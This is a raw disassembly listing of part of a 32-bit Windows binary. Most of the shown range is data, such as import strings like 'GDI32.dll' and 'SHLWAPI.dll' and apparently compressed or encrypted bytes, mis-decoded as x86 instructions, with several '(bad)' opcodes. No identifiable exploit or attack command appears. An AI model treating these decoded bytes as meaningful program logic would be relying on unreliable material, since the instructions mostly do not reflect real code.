  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	aaa    
  413c54:	inc    ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    DWORD PTR [ebx+0x0],eax
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    DWORD PTR [ebx+0x0],eax
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	push   ebp
  413f63:	gs inc esp
  413f65:	cdq    
  413f66:	xlat   BYTE PTR ds:[bx]
  413f68:	add    BYTE PTR [eax],al
  413f6a:	add    BYTE PTR [ecx],al
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	cmp    BYTE PTR [esi-0x2523d0ad],0x7f
  413f75:	inc    edx
  413f76:	pop    esi
  413f77:	mov    esi,0x2b0ffc4
  413f7c:	cmp    DWORD PTR [ebx],0xffffffd1
  413f7f:	test   ah,dh
  413f81:	dec    ebp
  413f82:	(bad)  
  413f84:	addr16 (bad) 
  413f86:	jno    0x413f67
  413f88:	mul    DWORD PTR [edi]
  413f8a:	jle    0x413f8d
  413f8c:	xchg   ebx,eax
  413f8d:	dec    edx
  413f8e:	push   ds
  413f8f:	mov    bh,0x99
  413f91:	mov    bl,0xff
  413f93:	aas    
  413f94:	gs (bad) 
  413f96:	mov    cl,0x1b
  413f98:	jge    0x41400a
  413f9a:	mov    WORD PTR [ebx+0xe],gs
  413f9d:	cwde   
  413f9e:	into   
  413f9f:	cmc    
  413fa0:	mov    ebx,0xa5646c81
  413fa5:	sahf   
  413fa6:	push   esp
  413fa7:	adc    al,0xba
  413fa9:	cmp    cl,BYTE PTR [edi+0xa265d7f]
  413faf:	mov    eax,ds:0x44b93d08
  413fb4:	xchg   esp,eax
  413fb5:	das    
  413fb6:	sbb    al,0x75
  413fb8:	(bad)  
  413fb9:	call   0x7b74225b
  413fbe:	sahf   
  413fbf:	iret   
  413fc0:	popa   
  413fc1:	mov    ebp,0x9f981bfc
  413fc6:	push   ebp
  413fc7:	jmp    0x66c7c2bf
  413fcc:	push   0x21
  413fce:	std    
  413fcf:	mov    ds:0xa3f99b85,eax
  413fd4:	dec    ebp
  413fd5:	sti    
  413fd6:	ret    
  413fd7:	ror    bh,1
  413fd9:	(bad)  
  413fda:	fisttp WORD PTR [ecx]
  413fdc:	add    edi,DWORD PTR [ebx]
  413fde:	dec    eax
  413fdf:	dec    ebx
  413fe0:	sbb    WORD PTR [ebx],di
  413fe3:	out    dx,al
  413fe4:	iret   
  413fe5:	jmp    0x413ffa
  413fe7:	jo     0x414008
  413fe9:	(bad)  
  413feb:	lock mov eax,0xa7d75f82
  413ff1:	dec    esi
  413ff2:	mov    eax,0xd6bdbcb4
  413ff7:	and    bl,bl
  413ff9:	sbb    BYTE PTR [eax+0x5af3862e],0x78
  414000:	add    eax,0xce343601
  414005:	mov    esi,0xeff96691
  41400a:	xchg   DWORD PTR [esi+0x33],edx
  41400d:	les    ebx,FWORD PTR [esi-0x633a37c2]
  414013:	out    dx,al
  414014:	dec    esp
  414015:	cmp    eax,0x45affcab
  41401a:	mov    esi,0x97a5a706
  41401f:	sbb    DWORD PTR [ecx+0x49],ecx
  414022:	fstp   DWORD PTR [ecx]
  414024:	xchg   esi,eax
  414025:	inc    eax
  414026:	jmp    0x2869:0xed66941c
  41402d:	cmp    bh,BYTE PTR ds:0x9ffbf5cf
  414033:	aad    0x6f
  414035:	push   ecx
  414036:	aad    0x77
  414038:	jmp    0x5899acb1
  41403d:	cmp    eax,0x2afe22c9
  414042:	lds    ebx,FWORD PTR [esi+0x16c2dab2]
  414048:	jo     0x414067
  41404a:	leave  
  41404b:	mov    ah,0x4c
  41404d:	dec    ebp
  41404e:	mov    BYTE PTR [esp+eax*4],ch
  414051:	xor    edx,DWORD PTR [ebp+edi*4-0x7]
  414055:	lods   eax,DWORD PTR ds:[esi]
  414056:	mov    ecx,0x565c3e33
  41405b:	xchg   edi,eax
  41405c:	aad    0x9b
  41405e:	adc    BYTE PTR [eax],ch
  414060:	mov    dh,0x9c
  414062:	xor    DWORD PTR [ebx],eax
  414064:	adc    edi,edi
  414066:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  414068:	cmp    BYTE PTR [ebx+0xa6a1e2],dh
	...
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0x3d82:0xacd52e96
  4140e5:	outs   dx,DWORD PTR ds:[esi]
  4140e6:	fadd   DWORD PTR [bx+si]
  4140e9:	add    BYTE PTR [eax],al
  4140eb:	add    DWORD PTR [eax],eax
  4140ed:	add    ch,bl
  4140ef:	test   BYTE PTR [edx],ch
  4140f1:	cmc    
  4140f2:	jecxz  0x414076
  4140f4:	dec    edx
  4140f5:	sub    al,0x24
  4140f7:	das    
  4140f8:	int    0x94
  4140fa:	sbb    eax,0xbb06f5c2
  4140ff:	aam    0x36
  414101:	sbb    al,0x69
  414103:	dec    ebp
  414104:	out    0x44,al
  414106:	shl    BYTE PTR [esi+0x76],0xd1
  41410a:	add    eax,0x420fc153
  41410f:	lods   al,BYTE PTR ds:[esi]
  414110:	mov    ah,0xc4
  414112:	cmp    eax,0x51691617
  414117:	fild   QWORD PTR [edi-0x2ce4a24c]
  41411d:	adc    BYTE PTR [ebx],dl
  41411f:	into   
  414120:	or     cl,BYTE PTR [esi+0x31]
  414123:	lea    eax,[esp+edx*1-0x50769197]
